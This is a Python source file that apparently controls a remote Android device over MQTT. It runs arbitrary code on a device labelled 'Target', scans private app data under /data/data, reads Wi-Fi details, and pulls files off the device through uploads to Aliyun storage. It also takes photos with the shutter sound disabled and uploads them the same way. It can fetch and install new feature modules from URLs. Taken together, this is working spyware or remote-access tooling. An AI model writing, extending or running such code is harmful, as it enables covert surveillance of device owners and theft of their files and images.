"""Client-side bridge for MQTT RPC and remote file operations."""

import json
import base64
import importlib
import os
import sys
import threading
from pathlib import PurePosixPath

import time
_STATE = {"files_dir": None, "lock": threading.RLock()}
_DEFAULT_DEVICE = {
    "name": "Target",
    "request_topic": "sys/device/request",
    "private_key": "",
    "allow_no_server_pubkey_response": True,
    "timeout": 10,
}
_CONFIG_NAME = "client_mqtt.json"


def call_feature(feature, action="run", *args):
    """Dispatch through the stable bootstrap so feature modules can be replaced."""
    import bootstrap
    return bootstrap.call_feature(feature, action, *args)


def feature_catalog():
    import bootstrap
    return json.dumps(bootstrap.describe_features(), ensure_ascii=False)


def install_feature(url, filename, sha256=""):
    import bootstrap
    return bootstrap.install_feature(url, filename, sha256)


def initialize(files_dir):
    _STATE["files_dir"] = str(files_dir)
    path = os.path.join(_STATE["files_dir"], _CONFIG_NAME)
    _STATE["config_path"] = path
    if not os.path.isfile(path):
        save_config({"devices": [_DEFAULT_DEVICE.copy()], "scan_limit": 100, "remote_root": "/data/data"})
    return {"ok": True, "files_dir": _STATE["files_dir"]}


def update_settings(values):
    config = load_config()
    if isinstance(values, str):
        values = json.loads(values)
    config.update(dict(values or {}))
    save_config(config)
    return json.dumps(config, ensure_ascii=False)


def load_config():
    path = _STATE.get("config_path")
    if not path or not os.path.isfile(path):
        return {"devices": [_DEFAULT_DEVICE.copy()], "scan_limit": 100, "remote_root": "/data/data"}
    try:
        with open(path, "r", encoding="utf-8") as config_file:
            value = json.load(config_file)
        return value if isinstance(value, dict) else {}
    except (OSError, ValueError):
        return {"devices": [_DEFAULT_DEVICE.copy()], "scan_limit": 100, "remote_root": "/data/data"}


def save_config(value):
    path = _STATE.get("config_path")
    if not path:
        return {"ok": False, "error": "service is not initialized"}
    os.makedirs(os.path.dirname(path), exist_ok=True)
    temporary = path + ".tmp"
    with open(temporary, "w", encoding="utf-8") as config_file:
        json.dump(value, config_file, ensure_ascii=False, indent=2)
    os.replace(temporary, path)
    return {"ok": True}


def _device_config(device=None):
    config = load_config()
    devices = config.get("devices") or [_DEFAULT_DEVICE.copy()]
    selected = device or devices[0]
    merged = _DEFAULT_DEVICE.copy()
    merged.update(selected)
    return merged


def rpc(code, device=None):
    """Execute short control code through the existing MQTT racing client."""
    from multi_mqtt import client_mqtt

    selected = _device_config(device)
    private_key = selected.get("private_key") or None
    started = time.perf_counter()
    response = client_mqtt.rpc(
        code,
        request_topic=selected["request_topic"],
        timeout=float(selected.get("timeout", 10)),
        client_private_key_bytes=int(private_key, 0) if private_key else None,
        allow_no_server_pubkey_response=bool(selected.get("allow_no_server_pubkey_response", False)),
    )
    if response is None:
        return {"ok": False, "error": "RPC timeout", "elapsed_ms": round((time.perf_counter() - started) * 1000, 2)}
    response["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 2)
    return response


def online(device=None):
    result = rpc("r = {'online': True}", device)
    return json.dumps({"ok": bool(result.get("ok")), "result": result}, ensure_ascii=False)


def scan_remote(root, offset=0, limit=100, device=None):
    result = parse_json_result(rpc(build_scan_code(root, offset, limit), device))
    return json.dumps(result, ensure_ascii=False)


def build_upload_code(remote_path, aliyun_config=None):
    """Build target code which uploads a file without returning its bytes via MQTT."""
    path_value = json.dumps(str(remote_path), ensure_ascii=False)
    return f'''import json
import aliyun_git
path = {path_value}
try:
    url = aliyun_git.upload(path, file_path=path.rsplit("/", 1)[-1])
    r = json.dumps({{"ok": True, "url": url, "name": path.rsplit("/", 1)[-1]}}, ensure_ascii=False)
except Exception as exc:
    r = json.dumps({{"ok": False, "error": repr(exc)}}, ensure_ascii=False)
'''


def upload_remote(remote_path, device=None):
    return parse_json_result(rpc(build_upload_code(remote_path), device))


def _set_aliyun_config(config):
    safe_config = dict(config or {})
    sys.__dict__.setdefault("_qgb_dict", {}).setdefault("aliyun_git", {}).update(safe_config)
    return safe_config


def download_transfer(url, config=None, save_to=None):
    """Download a short transfer URL outside MQTT, returning bytes or a local path."""
    _set_aliyun_config(config)
    aliyun_git = importlib.import_module("aliyun_git")
    data = aliyun_git.download(url, save_to=save_to, max_show_bytes_size=0)
    return {"ok": True, "path": data if save_to else None, "size": os.path.getsize(data) if save_to else len(data)}


def download_transfer_base64(url, config=None):
    """Download an image/file into memory for the Android bridge, never MQTT."""
    _set_aliyun_config(config or load_config().get("aliyun", {}))
    aliyun_git = importlib.import_module("aliyun_git")
    data = aliyun_git.download(url, max_show_bytes_size=0)
    return base64.b64encode(bytes(data)).decode("ascii")


def download_remote_to_file(url, name, config=None):
    root = _STATE.get("files_dir") or os.getcwd()
    target_dir = os.path.join(root, "downloads")
    os.makedirs(target_dir, exist_ok=True)
    safe_name = os.path.basename(str(name)) or "download.bin"
    target = os.path.join(target_dir, safe_name)
    result = download_transfer(url, config=config, save_to=target)
    return json.dumps(result, ensure_ascii=False)


def build_wifi_code():
    return '''import json
from android.content import Context
from android.text.format import Formatter
from com.chaquo.python import Python
app = Python.getPlatform().getApplication()
info = app.getSystemService(Context.WIFI_SERVICE).getConnectionInfo()
ssid = info.getSSID()
r = json.dumps({"ok": True, "wifi": {"ssid": ssid.strip('"') if ssid else None,
    "bssid": str(info.getBSSID()) if info.getBSSID() else None,
    "rssi": info.getRssi(), "link_speed": info.getLinkSpeed(),
    "frequency": info.getFrequency(), "ip": Formatter.formatIpAddress(info.getIpAddress())}}, ensure_ascii=False)
'''


def build_photo_code(facing=0, aliyun_config=None):
    return f'''import json, time
from android.hardware import Camera
from android.graphics import SurfaceTexture
from java import dynamic_proxy
import aliyun_git

class PhotoCallback(dynamic_proxy(Camera.PictureCallback)):
    def __init__(self):
        super().__init__()
        self.data = None
    def onPictureTaken(self, data, camera):
        if data is not None:
            self.data = bytes(data)

camera = None
callback = PhotoCallback()
try:
    for _ in range(3):
        try:
            camera = Camera.open({int(facing)})
            break
        except Exception:
            time.sleep(0.5)
    if camera is None:
        raise RuntimeError("camera open failed")
    try:
        camera.enableShutterSound(False)
    except Exception:
        pass
    camera.setPreviewTexture(SurfaceTexture(10))
    camera.startPreview()
    time.sleep(1.0)
    camera.takePicture(None, None, callback)
    started = time.time()
    while callback.data is None and time.time() - started < 8:
        time.sleep(0.1)
    if callback.data is None:
        raise TimeoutError("camera capture timeout")
    url = aliyun_git.upload(callback.data, file_path="photo_" + str(int(time.time() * 1000)) + ".jpg")
    r = json.dumps({{"ok": True, "url": url, "size": len(callback.data), "facing": {int(facing)}}}, ensure_ascii=False)
except Exception as exc:
    r = json.dumps({{"ok": False, "error": repr(exc)}}, ensure_ascii=False)
finally:
    if camera is not None:
        try: camera.stopPreview()
        except Exception: pass
        try: camera.release()
        except Exception: pass
'''


def build_scan_code(root, offset=0, limit=100, recursive=True):
    """Build bounded target code; the result is always an explicit JSON string."""
    root_value = json.dumps(str(root), ensure_ascii=False)
    offset_value = max(0, int(offset))
    limit_value = max(1, min(int(limit), 10000))
    recursive_value = bool(recursive)
    return f'''import json, os
root = os.path.abspath({root_value})
start = {offset_value}
limit = {limit_value}
recursive = {recursive_value!r}
items = []
errors = []
has_more = False
base = os.path.realpath(root)
if not os.path.isdir(root):
    r = json.dumps({{"ok": False, "error": "root is not a directory", "root": root}}, ensure_ascii=False)
else:
    for current, dirs, names in os.walk(root, followlinks=False):
        dirs.sort()
        names.sort()
        current_real = os.path.realpath(current)
        if not (current_real == base or current_real.startswith(base + os.sep)):
            dirs[:] = []
            continue
        dirs[:] = [d for d in dirs if not os.path.islink(os.path.join(current, d))]
        for name in names:
            path = os.path.join(current, name)
            try:
                real = os.path.realpath(path)
                if not (real == base or real.startswith(base + os.sep)):
                    continue
                stat = os.stat(path, follow_symlinks=False)
                if len(items) >= start + limit:
                    has_more = True
                    break
                if len(items) >= start:
                    items.append({{"path": os.path.relpath(path, root), "kind": "file", "size": stat.st_size, "modified": stat.st_mtime}})
            except OSError as exc:
                errors.append({{"path": os.path.relpath(path, root), "error": repr(exc)}})
        if has_more or not recursive:
            break
    r = json.dumps({{"ok": True, "root": root, "items": items, "errors": errors, "has_more": has_more, "next_offset": start + len(items)}}, ensure_ascii=False)
'''


def parse_json_result(response):
    if not response:
        return {"ok": False, "error": "empty RPC response"}
    value = response.get("r") if isinstance(response, dict) else response
    try:
        return json.loads(value) if isinstance(value, str) else value
    except (TypeError, ValueError) as exc:
        return {"ok": False, "error": f"invalid RPC JSON: {exc}", "raw": str(value)[:500]}


def normalize_relative_path(root, relative):
    root_path = PurePosixPath(str(root))
    candidate = PurePosixPath(str(relative))
    if candidate.is_absolute() or ".." in candidate.parts:
        raise ValueError("path escapes configured root")
    return str(root_path.joinpath(candidate))
